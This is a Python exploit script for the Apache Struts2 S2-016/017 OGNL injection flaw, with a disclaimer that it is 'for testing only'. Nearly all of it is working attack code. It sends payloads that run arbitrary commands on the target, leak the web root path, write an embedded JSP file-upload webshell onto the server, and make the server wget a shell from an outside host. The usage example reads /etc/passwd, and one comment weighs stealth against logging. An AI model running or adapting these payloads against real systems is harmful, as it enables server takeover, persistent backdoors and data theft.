#-*- coding:utf8 -*-
#Structs2 S2-016、017 Exploit By Kenny @ 2013.7.17
#僅供測試，造成任何損害概不負責
#ChangeLog  2013.7.18  
#ChangeLog  2013.7.19  改為POST模式
#ChangeLog  2013.7.20  新增-w指令 , 一鍵上傳JspShell

import urllib,urllib2,getopt,sys,requests
import re

WebShellUrl = "http://site.com/shell.txt"
WebShellName = "/info.jsp"


JspShell = """
<%@ page language="java" %><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/>
<html>
<%
int i=0;
String method=request.getParameter("act");
if(method!=null&&method.equals("up")){
String url=request.getParameter("url");
String text=request.getParameter("text");
File f=new File(url);
if(f.exists()){
f.delete();
}
try{
OutputStream o=new FileOutputStream(f);
o.write(text.getBytes());
o.close();
}catch(Exception e){
i++;
%>
Failed!!
<%
}
}
if(i==0){
%>
Success~!!
<%
}
%>
<body>
<form action='?act=up' method='post'>
<input size="100" value="<%=application.getRealPath("/") %>" name="url"><br>
<textarea rows="20" cols="80" name="text"></textarea><br>
<input type="submit" value="up" name="text"/>
</form>
</body>
</html>
"""


def info():
	print '-u Exploit Url'
	print '-d Command'
	print '-p WebRootPath'
	print '-g Download_Shell with wget (Linux Only)'
	print '-w Write_Shell (Win & Linux)  EX:-w /'
	

	print 'EX:python Structs2_S-17.py -u http://test.com/test.action -d "cat /etc/passwd"'

#抓網站路徑
def GetWebPath(url):
	Payload = 'redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28"%2F"%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D'
	Result = Exploit_Post(url,Payload)
	Result = "".join(Result.split())
	Result = Result.replace('\\','\\\\') #Windows路徑就補上\\
	return Result

def CommandExec(url,Command):
	InputCommand = ""
	for x in Command.split(' '):
		InputCommand += '\'%s\',' % x
	Payload = 'redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{'
	Payload += InputCommand.rstrip(',')
	Payload +='}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}'
	
	Result = Exploit_Post(url,Payload)
	if Result.find('<html') == -1: #命令成功
		return Result
	else:
		return 'Fail...'

def GetShell_Linux(url):
	global WebShellUrl,WebShellName
	WebPath =  str(GetWebPath(url))

	#可完整替換掉空格、\n ...等符號 不然會有路徑錯誤問題發生
	WebPath = "".join(WebPath.split())
	
	Payload = 'redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{'
	Payload += "'wget'," + "'" + WebShellUrl + "'" + "," + "'-O'" + "," + "'" + WebPath + WebShellName + "'"
	Payload +='}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}'
	#print Payload
	Exploit_Post(url,Payload)

def Write_JspShell(url,SavePath):
	
	SavePath = "/" + SavePath

	global WebShellName
	WebShellPath = "'" + GetWebPath(url) + SavePath + WebShellName + "'"
	print WebShellPath
	Headers = {'ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent' : 'Mozilla/5.0 (compatible; Indy Library)'}
	Payload = "?redirect:${%23path%3d"
	Payload += WebShellPath
	Payload += ",%23file%3dnew+java.io.File(%23path),%23file.createNewFile(),%23buf%3dnew+char[50000],%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getReader().read(%23buf),%23out%3dnew+java.io.BufferedWriter(new+java.io.FileWriter(%23file)),%23str%3dnew+java.lang.String(%23buf),%23out.write(%23str.trim()),%23out.close(),%23stm%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23stm.getWriter().println("
	Payload += '"' + GetWebPath(url) + WebShellName + '+Get Shell!!!"'  #返回值
	Payload += '),%23stm.getWriter().flush(),%23stm.getWriter().close()}'

	url += Payload

	Data = JspShell #上傳小馬
	try:
		r = requests.post(url, data=Data , timeout = 10)
		if r.text.find('<html') == -1:#寫入成功
			return r.text
		else:#寫入失敗
			return 'Fail.....>_<'
	except Exception as e:
		return str(e)

def Exploit_Post(url, Data):
	
	try:
		response = urllib2.urlopen(url, Data,timeout=10)
	except Exception as e:
		return str(e)
	#過濾異常字元
	Result = re.compile('[\\x00-\\x08\\x0b-\\x0c\\x0e-\\x1f]').sub('', response.read())
	return Result

#不隱蔽  會被LOG
def Exploit_Get(url, data):
	string = url + "?" + data

	req = urllib2.Request(string)
	try:
		response = urllib2.urlopen(req,timeout=10)
	except Exception as e:
		return e
	#過濾異常字元
	Result = re.compile('[\\x00-\\x08\\x0b-\\x0c\\x0e-\\x1f]').sub('', response.read())
	return Result


if __name__ == '__main__' :
	try:
		opts, args = getopt.getopt(sys.argv[1:],"u:d:pgw:")
	except:
		info()
		sys.exit(2)
	for opt, value in opts:
		if opt == '-u':
			url = value
		#命令執行
		elif opt == '-d':
			print CommandExec(url,value)
			
		#網站絕對路徑
		elif opt == '-p':
			print 'WebPath:',GetWebPath(url)

		#自動下載Webshell , Linux有Wget適用
		elif opt == '-g':
			try:
				GetShell_Linux(url)
			except Exception as e:
				print e
		elif opt == '-w':
			print Write_JspShell(url,value)
